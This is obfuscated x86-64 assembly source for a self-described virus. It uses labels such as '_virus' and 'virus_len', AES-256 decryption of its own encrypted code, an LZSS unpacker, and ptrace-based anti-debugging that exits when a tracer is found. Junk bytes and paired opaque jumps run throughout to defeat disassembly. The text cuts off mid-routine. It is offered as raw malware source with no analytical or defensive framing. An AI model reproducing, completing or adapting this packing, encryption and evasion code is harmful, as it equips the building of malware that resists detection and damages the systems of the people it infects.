..@ptdT7aFSU9CQ:
    mov         r3, 111b
    jmp         ..@lXsYJgrYWZg6
..@iG29rSS6nLP9:
    GGLOBAL     _packed
    mov         m8, r5 
    jmp         $+3
db 0x7b
    jb          ..@fkJm4TOg5cYR
    jae         ..@fkJm4TOg5cYR
..@mP1PVd430YYd:
    movdqu      xmm1, OWORD [rsp+0x30]
    aesimc      xmm0,xmm1
    jb          ..@1twl9QtuHj4W
    jae         ..@1twl9QtuHj4W
..@UZC4TfGOYpRR:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, 17
    mov         r2, rax
    xor         r3, r3
%endif
%endif
    jmp         $+4
db 0x23, 0x3e
    je          ..@NksgvYKjkFS7
    jne         ..@NksgvYKjkFS7
..@aIYQdILCQj3z:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0xa5, 0x9d, 0x46
    jmp         $+5
db 0x3f, 0x85, 0x2c
    jb          ..@EZijdujomtda
    jae         ..@EZijdujomtda
..@TK6gErQMlDFy:
    jz          ..@z61UjTBEMDQS
    mov         rdx, QWORD [rsp]
    sub         rdx, rcx
    jb          ..@XUuxQs5MnkBG
    jae         ..@XUuxQs5MnkBG
..@YOahu9ye1pIi:
%ifndef ENABLE_DEBUGGING
    CFILE       r5d
%endif
    jmp         $+3
db 0x94
    jmp         $+5
db 0xb7, 0x34, 0xef
    js          ..@TRzMf0iAPQIV
    jns         ..@TRzMf0iAPQIV
..@AM6XebsGCdGl:
    aeskeygenassist xmm2, xmm3, 0x1
    call        ..@ghdqv9nxe3Sd
    jb          ..@Cibm0bPcAcrV
    jae         ..@Cibm0bPcAcrV
..@TLIw0UOqCjJl:
    movdqu      OWORD [r1], xmm0
    movdqu      OWORD [r1+0x10], xmm1
    pop         r3
    jmp         $+3
db 0xa8
    jb          ..@Se6VvH6TSznS
    jae         ..@Se6VvH6TSznS
..@C1rzE0gb50zx:
%ifndef ENABLE_DEBUGGING
    add         rax, tracerline_size
    cmp         WORD [rax], 0x0a30
%endif
    js          ..@e3Gf6wN7FDWz
    jns         ..@e3Gf6wN7FDWz
..@wSxgCGyGvjD7:
    movdqu      xmm1, OWORD [rsp+0xa0]
    je          ..@reiOQSL1Qh3U
    jne         ..@reiOQSL1Qh3U
..@h1sJxdYSF39T:
    call        ..@kK1YSWDGYPTj
    jmp         $+4
db 0xd3, 0x92
    jmp         ..@mcuDg4cLcb6n
..@YUsABHtNw36i:
    sub         r2, non_encrypted_len
    mov         r5, r2
    jb          ..@RDEKCHUr8Dza
    jae         ..@RDEKCHUr8Dza
..@eUZnWXdHwECy:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    jb          ..@pVVAxSJ2ZBfA
    jae         ..@pVVAxSJ2ZBfA
..@fxn02K0XhBtM:
    call        ExitProgram
    jmp         $+3
db 0x1d
    jb          ..@F1RXvgLMhQ4u
    jae         ..@F1RXvgLMhQ4u
..@FepBzgSq94ys:
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    jmp         ..@mRcv3dLXLRzB
..@7kesANkRNuiN:
    jmp         ..@z1LuuSuldLQF
    jmp         $+5
db 0x6e, 0x03, 0x96
    jmp         $+5
db 0xb2, 0x75, 0xda
    jb          ..@MwDp7hT8YrjF
    jae         ..@MwDp7hT8YrjF
..@oMOL7tJMz0F0:
    jz          ..@MwDp7hT8YrjF
    jmp         $+5
db 0x95, 0x94, 0x9b
    jl          ..@p4yfApNlbqxg
    jge         ..@p4yfApNlbqxg
..@pVVAxSJ2ZBfA:
    movdqu      xmm1, OWORD [rsp+0x10]
    js          ..@tqHo2RmrxF0s
    jns         ..@tqHo2RmrxF0s
..@HXy96JTHEA9U:
    jne         ..@IAebKFVjuZLL
    jmp         $+5
db 0xb7, 0xf4, 0x4b
    jmp         ..@L1aESeY2M9yX
..@hdE451MDN6Yk:
    call        ..@kK1YSWDGYPTj
    jmp         ..@xKtT1EamC17n
Aes256KeyExpansion:
    jmp         ..@IqTUZnE2PKXK
..@z61UjTBEMDQS:
    mov         rax, rbx
    jmp         $+5
db 0xb7, 0xd4, 0x0f
    jmp         $+4
db 0x5e, 0x27
    jmp         ..@Y9RNyyWx2XQm
..@yCD55ZKfOen3:
    and         r3, 0ffffffffffffffe0h
    jb          ..@i7pl1PTBzvHD
    jae         ..@i7pl1PTBzvHD
..@Ut3E6HAdl4YA:
    xor         rbx, rbx
    jmp         $+3
db 0x5d
    jmp         ..@z61UjTBEMDQS
..@pwdcGd77Va2N:
    mov         rdi, QWORD [rsp+3*bytes]
    jmp         $+5
db 0x50, 0xbf, 0x30
    jmp         ..@JwtdZEA4mKYM
DecryptExecutableCode:
    jmp         ..@GC62BpfEQdQL
..@i2JXlct6g7Nw:
    VAR         public, _virus
    mov         r2, r5
    mov         r3, keycreation_len
    jmp         ..@g87CWgNJ6xXG
..@lVZi0fbNV6DG:
    add         r2, 1
    dec         r3
    jmp         $+4
db 0xbe, 0x6f
    jmp         ..@HUxLjGqA2CB5
..@qWvggIJKgEd4:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    mov         r1, rax
%endif
%endif
    jmp         ..@h5dhDXjblblF
..@MGzWcV9eO8jC:
    call        Aes256Decryption
    jmp         $+5
db 0xbe, 0x59, 0xdb
    js          ..@b4tiX6Km53r7
    jns         ..@b4tiX6Km53r7
..@hSPLg2PL602J:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_WAIT4
%endif
%endif
    jmp         $+3
db 0xe7
    jb          ..@YltHLcWHyDaZ
    jae         ..@YltHLcWHyDaZ
..@4hlzBARdXokw:
    movdqu      OWORD [rsp+0x80],xmm0
    movdqu      xmm1, OWORD [rsp+0x90]
    jl          ..@dyO26NAUcrJ2
    jge         ..@dyO26NAUcrJ2
..@VGv0M8EdaCyH:
    pop         r3
    jl          ..@5ODdDsBi85gS
    jge         ..@5ODdDsBi85gS
..@Z4NbZnLYNJr9:
    push        r1
    push        r2
    push        r3
    jmp         $+3
db 0x9a
    jmp         ..@faOdOqCofJOK
..@nxmaQEbp0rbm:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    pop         rax
%endif
%endif
    js          ..@GG8OgQHVMH8G
    jns         ..@GG8OgQHVMH8G
..@RoIlnOfM8RKv:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
%endif
%endif
    jmp         $+5
db 0x50, 0x54, 0xcf
    jmp         ..@px1fuLXiDvEP
..@OrmvIwGZUh4P:
%ifndef ENABLE_DEBUGGING
    jnz         ..@7so1W3g3y4yv
%endif
    jmp         $+4
db 0x5d, 0x30
    jmp         $+4
db 0x51, 0x53
    jmp         ..@6x1aYeGHrA1l
..@O52iMlsxIXXD:
    movdqu      xmm1, OWORD [rsp+0xb0]
    jmp         ..@dbHnb8xj0GaN
..@YATOZT2Qul2d:
    xor         rax, rax
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0xca, 0xa0
    jmp         ..@LwtlveLUmoqL
..@F5hu1rp0q8ti:
    mov         r2, QWORD [r4]
    jmp         $+3
db 0x13
    je          ..@blTC7rPkcG2l
    jne         ..@blTC7rPkcG2l
..@px1fuLXiDvEP:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_WAIT4
%endif
%endif
    jmp         $+3
db 0xc6
    jmp         ..@nxmaQEbp0rbm
..@3bzDuexa61T2:
    ret
    jmp         DecryptExecutableCode
..@iKQKbR4PnQjs:
    test        rax, rax
    js          ..@J2CG0REqTDVe
    jns         ..@J2CG0REqTDVe
..@afFmgNXEbIgA:
    movdqa      OWORD [rsi+0xa0], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0x46, 0x62
    jmp         ..@3rPOEfnbGPLw
..@Qbduxqtoe8ch:
    movdqu      xmm1, OWORD [rsp+0x20]
    jmp         $+5
db 0xfe, 0xa4, 0x9b
    jl          ..@aOWVdUNIkFW8
    jge         ..@aOWVdUNIkFW8
..@OUZ9EJJ1bHAe:
    sub         r1, QWORD [r5]
    jmp         $+5
db 0x0e, 0xa8, 0x31
    jmp         $+4
db 0xdb, 0x85
    jmp         ..@eYxFmtilO1rp
..@hHuEQYOjOOoB:
    movdqu      OWORD [rsp+0x10],xmm0
    jmp         $+3
db 0xe7
    jmp         $+3
db 0xae
    jmp         ..@Qbduxqtoe8ch
..@iNRVE439mUyT:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x30]
    aesdec      xmm0, xmm1
    jb          ..@nplPFTcwU12C
    jae         ..@nplPFTcwU12C
..@LwtlveLUmoqL:
    GGLOBAL     _decrypt
    jmp         $+3
db 0xe0
    jmp         $+4
db 0xc2, 0x45
    jl          ..@Fqj9bjlUUjEI
    jge         ..@Fqj9bjlUUjEI
..@4sy46YPYsLkw:
    movdqu      xmm1, OWORD [rsp+0x90]
    jmp         $+5
db 0xbc, 0x31, 0x24
    jmp         ..@Z9OsZWWlV6E2
..@ZspTbMOPamak:
    jl          ..@yNLY9tJTPaYn
    jmp         $+4
db 0xd6, 0x09
    jl          ..@MYH6NCwy3zJn
    jge         ..@MYH6NCwy3zJn
..@1twl9QtuHj4W:
    movdqu      OWORD [rsp+0x30],xmm0
    jl          ..@OQ7bKdm70nWW
    jge         ..@OQ7bKdm70nWW
..@IRYl8k3yegRj:
    sub         r4, r1
    jb          ..@EfCjmO9Xtz3C
    jae         ..@EfCjmO9Xtz3C
..@EZijdujomtda:
    movdqu      xmm1, OWORD [rsp+0x70]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x60]
    je          ..@xhRrjLrHbQiF
    jne         ..@xhRrjLrHbQiF
..@QHiqQ5BvlmKI:
    movdqu      OWORD [rsp+0x70],xmm0
    movdqu      xmm1, OWORD [rsp+0x80]
    aesimc      xmm0,xmm1
    jmp         ..@4hlzBARdXokw
..@EdEu1Joe7IYv:
    xor         rax, rax
    jmp         ..@tWOQHoyMD27o
..@Vk8UpiAkXWGY:
    mov         QWORD [rsp+_AESD_OFF.length], r2
    jmp         ..@FepBzgSq94ys
..@m3Cv27gSMzCp:
    je          ..@F1RXvgLMhQ4u
    jmp         ..@MCtP7lzCltKg
..@ijeG4dJWAUZc:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_PTRACE
%endif
%endif
    js          ..@7p0fdQ60Ayg5
    jns         ..@7p0fdQ60Ayg5
..@BZiN1IJrlIUT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
    mov         rax, SYS_PTRACE
%endif
%endif
    jb          ..@y2ihpZKjsCOd
    jae         ..@y2ihpZKjsCOd
..@KMHeCOOH4rur:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jb          ..@Mf3OY4ekiF5q
    jae         ..@Mf3OY4ekiF5q
..@yMjJdtVUOP84:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r3, r3
    xor         r4, r4
%endif
%endif
    jmp         $+4
db 0x81, 0x13
    jl          ..@hSPLg2PL602J
    jge         ..@hSPLg2PL602J
..@OQ7bKdm70nWW:
    movdqu      xmm1, OWORD [rsp+0x40]
    jmp         $+5
db 0xb9, 0x65, 0xdf
    jb          ..@OYZO6607zws6
    jae         ..@OYZO6607zws6
..@7p0fdQ60Ayg5:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    jmp         $+4
db 0x25, 0x02
    jl          ..@U0mCDDKvwwB0
    jge         ..@U0mCDDKvwwB0
..@vJrfnU0Jh3Y9:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r3, r3
%endif
%endif
    jmp         $+5
db 0x0b, 0xb7, 0xe9
    jl          ..@BZiN1IJrlIUT
    jge         ..@BZiN1IJrlIUT
..@ruSxsluXJeLX:
    push        r1
    jmp         $+5
db 0x1f, 0xce, 0x01
    js          ..@VaCTZUZPFiGz
    jns         ..@VaCTZUZPFiGz
..@M5uKy9VyeuLr:
    movdqu      xmm2, OWORD [r2+rax]
    jmp         ..@Qao8XQpuThER
..@Kk1bR55nTDPo:
    movdqu      OWORD [rsp+0x40],xmm0
    jmp         $+4
db 0x1a, 0x30
    jmp         $+4
db 0x05, 0x37
    jmp         ..@oBtpwNJIvsf1
..@eYxFmtilO1rp:
    DESTROY_MX_VAR
    jmp         $+4
db 0x4b, 0xf2
    jl          ..@iF34KYfi0EpE
    jge         ..@iF34KYfi0EpE
..@4M14N5ISTT3f:
    push        r1
    jmp         $+5
db 0xb4, 0xed, 0x1e
    jmp         ..@JCNPF4rRxt90
..@L1aESeY2M9yX:
    add         rdi, bytes
    jmp         $+3
db 0xaa
    jl          ..@wOyqQ25gX3nd
    jge         ..@wOyqQ25gX3nd
..@JwtdZEA4mKYM:
    mov         rbx, rdi
    jmp         $+5
db 0x54, 0x43, 0x26
    jl          ..@CIGfqG19Dumm
    jge         ..@CIGfqG19Dumm
..@eOwLPTSZ28w1:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        rax, rax
%endif
%endif
    jb          ..@ODs9WMdUNJCC
    jae         ..@ODs9WMdUNJCC
..@JETBH1qE9WbH:
%ifndef ENABLE_DEBUGGING
    mov         r5, rax
%endif
    jmp         $+4
db 0x17, 0x87
    je          ..@musegg8HsG1M
    jne         ..@musegg8HsG1M
..@hS6typLwBiLW:
    add         rsp, _AESD_OFF_size+0x100
    jl          ..@6xHcgV0Ao1ld
    jge         ..@6xHcgV0Ao1ld
..@pw6gTeySTFrz:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0x16, 0x40
    js          ..@ZhY4TmZUg0AD
    jns         ..@ZhY4TmZUg0AD
..@U0mCDDKvwwB0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, rax
    call        ExitProgram
%endif
%endif
    jmp         $+4
db 0x47, 0x6d
    jb          ..@koUslAyD8iQL
    jae         ..@koUslAyD8iQL
..@iF34KYfi0EpE:
    mov         rax, r1
    jmp         $+3
db 0x12
    jmp         ..@V9G6OOk0ugFh
..@p4yfApNlbqxg:
    call        Strncmp
    jmp         $+4
db 0x9d, 0x1c
    je          ..@iKQKbR4PnQjs
    jne         ..@iKQKbR4PnQjs
..@JCNPF4rRxt90:
    call        Strlen
    jmp         $+5
db 0xb4, 0x2f, 0x1d
    jb          ..@tATfcKMegOi1
    jae         ..@tATfcKMegOi1
..@GC62BpfEQdQL:
    GGLOBAL     virus_len
    js          ..@FNtLOMNC9KAe
    jns         ..@FNtLOMNC9KAe
..@wKNUhqBcnJAV:
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    jmp         $+5
db 0xc2, 0x3e, 0x4b
    jmp         $+4
db 0x7e, 0x55
    jmp         ..@lTdzFWMxXcRN
..@As9pn46rw2t2:
    movdqu      xmm1, OWORD [rsp+0x80]
    js          ..@aIYQdILCQj3z
    jns         ..@aIYQdILCQj3z
..@h5dhDXjblblF:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r2, r2
%endif
%endif
    jmp         $+5
db 0x49, 0x9d, 0x8a
    jmp         ..@yMjJdtVUOP84
..@mRcv3dLXLRzB:
    mov         rsi, rsp
    jmp         $+3
db 0x46
    jmp         $+4
db 0x13, 0xb3
    jb          ..@77tddABsm01j
    jae         ..@77tddABsm01j
..@E2usZmntPwr7:
    ret
    jb          ..@ghdqv9nxe3Sd
    jae         ..@ghdqv9nxe3Sd
..@7fZnDej3bph2:
    movdqu      xmm0, [rsi+rcx]
    jmp         $+4
db 0xf1, 0xee
    jmp         $+4
db 0x21, 0x75
    jmp         $+4
db 0x17, 0x72
    jmp         $+3
db 0xed
    jmp         ..@83zp4709kXuw
..@XcVhGlSQR4AR:
    aeskeygenassist xmm2, xmm3, 0x2
    call        ..@ghdqv9nxe3Sd
    movdqa      OWORD [rsi+0x40], xmm1
    jmp         $+5
db 0x0c, 0xf9, 0x82
    js          ..@fa1nAqIQZSCd
    jns         ..@fa1nAqIQZSCd
..@NksgvYKjkFS7:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
%endif
%endif
    jmp         ..@ijeG4dJWAUZc
..@V0iR2eKMKs7m:
%ifndef ENABLE_DEBUGGING
    VAR         public, debugging
%endif
    jmp         $+3
db 0x51
    je          ..@4iUfmVlC1v3G
    jne         ..@4iUfmVlC1v3G
AntiDebugging:
    jmp         ..@RdUEdoQdCHCd
..@cdDrMPnactcn:
    jne         ..@rQkej9lPs49w
    jmp         ..@iG29rSS6nLP9
..@AiJTLkPLgYuv:
    aeskeygenassist xmm2, xmm3, 0x40
    jmp         $+4
db 0xc7, 0x92
    jmp         $+5
db 0x21, 0x5e, 0x09
    jmp         $+4
db 0xb9, 0xf0
    je          ..@MdAykmpWAGYx
    jne         ..@MdAykmpWAGYx
..@Wpp0WtNboOBN:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    cmp         eax, 0x0
    jl          ..@U0mCDDKvwwB0
%endif
%endif
    jmp         $+5
db 0x8f, 0xec, 0x33
    jb          ..@1RcsZbdsQ6eg
    jae         ..@1RcsZbdsQ6eg
..@2ytPslXWQ8NJ:
    movdqa      xmm4, xmm1
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    jl          ..@I8Gu9gXiLLVR
    jge         ..@I8Gu9gXiLLVR
Memmem:
    jmp         ..@ruSxsluXJeLX
..@eZY8A4aj9xIg:
    mov         al, BYTE [r1]
    jb          ..@POk3g8NKitSs
    jae         ..@POk3g8NKitSs
..@bEHP0kLWFBeO:
    test        r5, r5
    jl          ..@SXlPZq503JJG
    jge         ..@SXlPZq503JJG
..@Mf3OY4ekiF5q:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
    call        ExitProgram
%endif
    jmp         $+3
db 0x72
    jmp         $+4
db 0xea, 0x3c
    js          ..@95Q1lQx4nCgx
    jns         ..@95Q1lQx4nCgx
..@FCybMXcMHG8L:
    push        rbp
    jmp         ..@3O9IKtkh07ai
..@yNLY9tJTPaYn:
    mov         r1, rax
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x9e, 0x83
    jl          ..@HGpesmaqAvPH
    jge         ..@HGpesmaqAvPH
..@OQXnD4IyYrhY:
    xor         rax, rax
    jb          ..@VGv0M8EdaCyH
    jae         ..@VGv0M8EdaCyH
..@INtMuRhTpF8h:
%ifndef ENABLE_DEBUGGING
    mov         r2, 0x200
    VAR         public, tracerline
%endif
    jmp         $+4
db 0x6f, 0x71
    jmp         $+3
db 0xb3
    jmp         $+4
db 0x1d, 0xa7
    jl          ..@M5LOse6L33fi
    jge         ..@M5LOse6L33fi
..@nplPFTcwU12C:
    movdqu      xmm1, OWORD [rsp+0x20]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x10]
    jmp         $+5
db 0xd9, 0x36, 0x67
    je          ..@S89Rum6c7V5J
    jne         ..@S89Rum6c7V5J
..@Qh6cRdbNeNY4:
    mov         vsp, rdi
    je          ..@pgZ1UBdIMUDW
    jne         ..@pgZ1UBdIMUDW
..@xu0ZRCXrbHsF:
    sub         al, BYTE [r2]
    jmp         $+3
db 0xd3
    jmp         $+4
db 0x79, 0xee
    jmp         ..@QFZ67zy3xX6s
..@xKtT1EamC17n:
    movdqa      OWORD [rsi+0x70], xmm3
    aeskeygenassist xmm2, xmm3, 0x8
    call        ..@ghdqv9nxe3Sd
    jb          ..@ZGlUZkBELNIR
    jae         ..@ZGlUZkBELNIR
..@8rJsPDmZmjKD:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x5d
    jmp         ..@O52iMlsxIXXD
..@zLNRLQcnWlEQ:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jmp         $+4
db 0xc1, 0x9a
    jmp         $+4
db 0x00, 0x3d
    js          ..@VJ0bo4sMAJgj
    jns         ..@VJ0bo4sMAJgj
..@Dum2GxPHMz8u:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    sub         rsp, bytes
    mov         QWORD [rsp], 0x00
%endif
%endif
    jb          ..@qrPXEujPmVR3
    jae         ..@qrPXEujPmVR3
..@IqTUZnE2PKXK:
    movdqu      xmm1, [rdi]
    jl          ..@bbn2aZSqZI1f
    jge         ..@bbn2aZSqZI1f
..@a8QKbOnMEYjT:
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    jmp         $+4
db 0x6a, 0xf3
    jmp         $+5
db 0xba, 0x24, 0x39
    jl          ..@zLNRLQcnWlEQ
    jge         ..@zLNRLQcnWlEQ
..@EfCjmO9Xtz3C:
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    jmp         $+5
db 0xee, 0x8e, 0xa7
    jl          ..@ftk9SOFipnTw
    jge         ..@ftk9SOFipnTw
..@mPS2pmyKXXIe:
    movdqa      OWORD [rsi+0xd0], xmm3
    jmp         ..@AiJTLkPLgYuv
..@XPk77s7Q6ZZL:
%ifndef ENABLE_DEBUGGING
    jne         ..@U0mCDDKvwwB0
%endif
    jmp         ..@YOahu9ye1pIi
..@95Q1lQx4nCgx:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_GETPPID
    syscall
%endif
%endif
    jmp         $+4
db 0x12, 0xfb
    jl          ..@WF5FS83ZERax
    jge         ..@WF5FS83ZERax
..@tqHo2RmrxF0s:
    aesimc      xmm0,xmm1
    jmp         ..@hHuEQYOjOOoB
..@LGvXO22j3awT:
    call        AntiDebugging
    jmp         $+5
db 0x0b, 0xda, 0x89
    jl          ExitProgram
    jge         ExitProgram
..@TPN9PqEUP8yA:
    movdqu      OWORD [rsp+0x60],xmm0
    movdqu      xmm1, OWORD [rsp+0x70]
    aesimc      xmm0,xmm1
    jmp         $+3
db 0xc2
    jmp         ..@QHiqQ5BvlmKI
..@IAebKFVjuZLL:
    add         rdi, bytes
    jmp         $+3
db 0xee
    jmp         $+4
db 0x1b, 0x9d
    jmp         $+4
db 0x8f, 0xcd
    jmp         ..@cibwAmQTw24F
..@YltHLcWHyDaZ:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    jmp         $+3
db 0xb4
    jmp         $+5
db 0x0d, 0x54, 0x6e
    jb          ..@751VUAZ9awVE
    jae         ..@751VUAZ9awVE
..@QEImVP063wra:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@7so1W3g3y4yv
%endif
%endif
    jmp         $+5
db 0x12, 0x41, 0x07
    je          ..@50uAxpc4IwBb
    jne         ..@50uAxpc4IwBb
..@XxQvwFjeVmjp:
    xor         r2, r2
    xor         r3, r3
    jmp         $+3
db 0x82
    jmp         ..@IMWIaLV3Sj9o
ExitProgram:
    jmp         ..@2PrZRfAkt5HI
..@QYBqHJfM9TLf:
%ifndef ENABLE_DEBUGGING
    mov         r3, debugging_size
%endif
    jmp         $+5
db 0xf2, 0x7f, 0x41
    jl          ..@V0iR2eKMKs7m
    jge         ..@V0iR2eKMKs7m
..@RMwE6GPSJR8f:
    movdqu      xmm1, OWORD [rsp+0xa0]
    js          ..@C0aUX6g9fxwG
    jns         ..@C0aUX6g9fxwG
..@R7lf7sT541ym:
    jmp         ..@tWOQHoyMD27o
    js          ..@uiiNhVsx60Jz
    jns         ..@uiiNhVsx60Jz
..@kK1YSWDGYPTj:
    pshufd      xmm2, xmm2, 0xaa
    jb          ..@j1IWsOQajP89
    jae         ..@j1IWsOQajP89
..@fkJm4TOg5cYR:
    call        Processes
    xor         r1, r1
    js          ..@1JzdDbPtpR0g
    jns         ..@1JzdDbPtpR0g
..@CgcL7w0aui2w:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0x1
    mov         rax, SYS_WRITE
%endif
    jb          ..@KMHeCOOH4rur
    jae         ..@KMHeCOOH4rur
..@3rPOEfnbGPLw:
    call        ..@kK1YSWDGYPTj
    movdqa      OWORD [rsi+0xb0], xmm3
    aeskeygenassist xmm2, xmm3, 0x20
    jmp         $+3
db 0x16
    jb          ..@Xnay7fRhJfRx
    jae         ..@Xnay7fRhJfRx
..@TzRvSUakhx9u:
    mov         r4, m4
    js          ..@z1LuuSuldLQF
    jns         ..@z1LuuSuldLQF
..@qFNACayWkrvr:
    mov         rax, SYS_FORK
    syscall
    je          ..@cs3LkOzQLhLC
    jne         ..@cs3LkOzQLhLC
..@z1LuuSuldLQF:
    mov         r1, QWORD [rsp]
    jmp         ..@F5hu1rp0q8ti
..@RdUEdoQdCHCd:
    xor          r1, r1
    xor          r2, r2
    xor          r3, r3
    jmp         $+4
db 0x61, 0xe5
    jmp         $+3
db 0x1b
    jmp         $+4
db 0xda, 0x63
    jmp         ..@uKNoOc4Ts3af
..@fa1nAqIQZSCd:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         ..@h1sJxdYSF39T
..@QFZ67zy3xX6s:
    jmp         ..@VGv0M8EdaCyH
    jmp         $+4
db 0x9e, 0x08
    js          ..@OpXslDHj5HIV
    jns         ..@OpXslDHj5HIV
..@cs3LkOzQLhLC:
    cmp         eax, 0x0
    jmp         $+3
db 0xa4
    jmp         ..@ZspTbMOPamak
..@4Cxg3Ehxgcds:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xb0],xmm0
    movdqu      xmm1, OWORD [rsp+0xc0]
    js          ..@qb6mIHr9tZYH
    jns         ..@qb6mIHr9tZYH
..@Xnay7fRhJfRx:
    call        ..@ghdqv9nxe3Sd
    movdqa      OWORD [rsi+0xc0], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    jl          ..@0y9bEpjFe8cr
    jge         ..@0y9bEpjFe8cr
..@pglEGH1ylmkC:
    add         rsp, bytes
    VAR         public, _start
    jmp         $+3
db 0xbc
    jmp         ..@pKx84NQJdExV
..@2UHX1YCCGTdb:
    movdqa      OWORD [rsi+0xe0], xmm1
    jl          ..@E2usZmntPwr7
    jge         ..@E2usZmntPwr7
..@mrjD7tE7p7Xf:
    pxor        xmm1, xmm4
    jmp         $+5
db 0x84, 0xcb, 0xb4
    jmp         ..@q4CEAXXQdlIn

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@Ht0jDWdUPh6Q
..@RmFcZXRMXh8J:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jb          ..@QwcMUb2tNFTv
    jae         ..@QwcMUb2tNFTv
..@QwcMUb2tNFTv:
    mov         dl, BYTE [rbx]
    jmp         $+3
db 0x56
    jmp         ..@msHIXNbDwd1A
..@6PAhgf4iMBph:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+4
db 0xe5, 0x77
    jb          ..@atmx05tKxyU4
    jae         ..@atmx05tKxyU4
..@sG8TjhcsPwEO:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    jl          ..@OHSLXg5PwCqf
    jge         ..@OHSLXg5PwCqf
..@dkluXeJIpYpw:
    xor         rcx, rcx
    jmp         $+3
db 0xcc
    js          ..@v3wWVD2jKqjd
    jns         ..@v3wWVD2jKqjd
..@n06IhGPXHklB:
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jg          ..@ioS3Vr8r9ZDg
    jmp         ..@mv9vMHKfEv2l
..@cI6Rx8Df5IJx:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         $+3
db 0xb1
    js          ..@r3RPGXTkiBx4
    jns         ..@r3RPGXTkiBx4
..@gmfLyx6WOkab:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         ..@iz8pzRzCXh97
    jmp         $+4
db 0x19, 0x10
    jmp         ..@L0LUqhnI9nHW
..@8jMMzUDErvvW:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         $+3
db 0x44
    jmp         $+5
db 0x99, 0x78, 0x9e
    jb          ..@gpuSohsNxHFm
    jae         ..@gpuSohsNxHFm
..@ioS3Vr8r9ZDg:
    test        rax, rax
    jz          ..@L0LUqhnI9nHW
    jmp         $+4
db 0xd4, 0x03
    jmp         $+5
db 0x58, 0xac, 0x72
    jmp         $+4
db 0xe4, 0xd8
    js          ..@2FQ9RSc9G2Aj
    jns         ..@2FQ9RSc9G2Aj
..@L0LUqhnI9nHW:
    mov         rcx, POSITION_BITS
    jmp         $+4
db 0xe2, 0x12
    jb          ..@uDEIymrHnCld
    jae         ..@uDEIymrHnCld
..@lb5te3GuSJ0C:
    sub         rsp, _LZSSD_OFF_size
    jb          ..@Z3TEXfAGEF7q
    jae         ..@Z3TEXfAGEF7q
..@P5gmmmDn6eHx:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
    mov         edx, 111b
    mov         esi, 0x22
%endif
    jmp         ..@MS6OLYcldIVN
..@qKzlg1hR1mkh:
    pop         rdi
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+3
